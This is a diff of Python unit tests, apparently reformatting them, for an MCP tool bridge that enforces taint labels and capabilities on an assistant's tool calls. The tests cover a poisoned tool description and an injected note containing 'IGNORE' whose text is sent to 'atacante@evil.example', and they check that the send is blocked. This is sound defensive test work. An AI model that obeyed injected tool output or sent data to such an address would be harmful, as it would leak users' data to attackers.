@@ -25,7 +25,8 @@ class McpBridgeTests(unittest.TestCase):
         self.mcp = McpStdioClient([sys.executable, SERVER]).start()
         self.addCleanup(self.mcp.close)
         self.report = McpBridge(
-            self.mcp, "pub-mcp", lambda m, h: self.w.publish(self.host, "pub-mcp", m, h)).admit_all()
+            self.mcp, "pub-mcp", lambda m, h: self.w.publish(self.host, "pub-mcp", m, h)
+        ).admit_all()
 
     def call(self, cap, args, session):
         tok = self.host.mint(cap, [{"holder": "assistant"}])
@@ -37,29 +38,44 @@ class McpBridgeTests(unittest.TestCase):
         return s
 
     def test_admission_report(self):
-        self.assertEqual(sorted(self.report.admitted), ["calc_add", "read_note", "send_report"])
-        self.assertIn("notes_helper", self.report.rejected)        # descricao envenenada
-        self.assertTrue(any("SELO004" in f for f in self.report.rejected["notes_helper"]))
+        self.assertEqual(
+            sorted(self.report.admitted), ["calc_add", "read_note", "send_report"]
+        )
+        self.assertIn("notes_helper", self.report.rejected)  # descricao envenenada
+        self.assertTrue(
+            any("SELO004" in f for f in self.report.rejected["notes_helper"])
+        )
 
     def test_annotations_become_labels(self):
         by_name = {t["name"]: tool_to_manifest(t, "p") for t in self.mcp.list_tools()}
-        self.assertEqual((by_name["calc_add"]["effect"], by_name["calc_add"]["taint_out"]), ("read", []))
+        self.assertEqual(
+            (by_name["calc_add"]["effect"], by_name["calc_add"]["taint_out"]),
+            ("read", []),
+        )
         self.assertEqual(by_name["read_note"]["taint_out"], ["EXTERNAL"])
-        self.assertEqual((by_name["send_report"]["effect"], by_name["send_report"]["forbid_taint"]),
-                         ("external", ["EXTERNAL"]))               # padrao MCP: destrutiva, mundo aberto
+        self.assertEqual(
+            (by_name["send_report"]["effect"], by_name["send_report"]["forbid_taint"]),
+            ("external", ["EXTERNAL"]),
+        )  # padrao MCP: destrutiva, mundo aberto
 
     def test_calls_go_through_selo_to_the_real_mcp_server(self):
         s = self.session()
         self.assertEqual(self.call("calc_add", {"a": 2, "b": 3}, s)["out"], "5")
-        self.assertIn("enviado para ana@corp.example",
-                      self.call("send_report", {"to": "ana@corp.example", "text": "ok"}, s)["out"])
+        self.assertIn(
+            "enviado para ana@corp.example",
+            self.call("send_report", {"to": "ana@corp.example", "text": "ok"}, s)[
+                "out"
+            ],
+        )
 
     def test_injection_via_mcp_tool_output_is_blocked(self):
         s = self.session()
         note = self.call("read_note", {"url": "https://notas.example/mal"}, s)
         self.assertIn("IGNORE", note["out"])
         with self.assertRaises(RemoteError) as cm:
-            self.call("send_report", {"to": "atacante@evil.example", "text": note["out"]}, s)
+            self.call(
+                "send_report", {"to": "atacante@evil.example", "text": note["out"]}, s
+            )
         self.assertEqual(cm.exception.code, "tainted_context")
 
     def test_poisoned_tool_is_not_callable(self):
@@ -118,14 +134,21 @@ class McpClientRegressionTests(unittest.TestCase):
         self.assertEqual(client.server_info, {"name": "ok"})
 
     def test_malformed_responses_fail_cleanly(self):
-        messages = [[], {"id": 1, "result": {}},
-                    {"jsonrpc": "2.0", "id": 1, "result": []},
-                    {"jsonrpc": "2.0", "id": 1, "error": "oops"},
-                    {"jsonrpc": "2.0", "id": 1},
-                    {"jsonrpc": "2.0", "id": 1, "result": {}, "error": {}}]
+        messages = [
+            [],
+            {"id": 1, "result": {}},
+            {"jsonrpc": "2.0", "id": 1, "result": []},
+            {"jsonrpc": "2.0", "id": 1, "error": "oops"},
+            {"jsonrpc": "2.0", "id": 1},
+            {"jsonrpc": "2.0", "id": 1, "result": {}, "error": {}},
+        ]
         for message in messages:
             with self.subTest(message=message):
-                client = self.client("import sys; sys.stdin.readline(); print(" + repr(json.dumps(message)) + ", flush=True)")
+                client = self.client(
+                    "import sys; sys.stdin.readline(); print("
+                    + repr(json.dumps(message))
+                    + ", flush=True)"
+                )
                 with self.assertRaises(McpError) as cm:
                     client.start()
                 self.assertEqual(cm.exception.code, "mcp_protocol")
@@ -133,7 +156,9 @@ class McpClientRegressionTests(unittest.TestCase):
 
     def test_repeated_pagination_cursor_is_rejected(self):
         client = McpStdioClient([])
-        with patch.object(client, "request", return_value={"tools": [], "nextCursor": "same"}) as request:
+        with patch.object(
+            client, "request", return_value={"tools": [], "nextCursor": "same"}
+        ) as request:
             with self.assertRaises(McpError) as cm:
                 client.list_tools()
         self.assertEqual(cm.exception.code, "mcp_pagination")
@@ -144,7 +169,9 @@ class McpClientRegressionTests(unittest.TestCase):
             for value in ("false", "true", 0, 1, None, [], {}):
                 with self.subTest(hint=hint, value=value):
                     with self.assertRaises(McpError) as cm:
-                        tool_to_manifest({"name": "x", "annotations": {hint: value}}, "p")
+                        tool_to_manifest(
+                            {"name": "x", "annotations": {hint: value}}, "p"
+                        )
                     self.assertEqual(cm.exception.code, "mcp_annotations")
 
     def test_timeout_must_be_positive_and_finite(self):
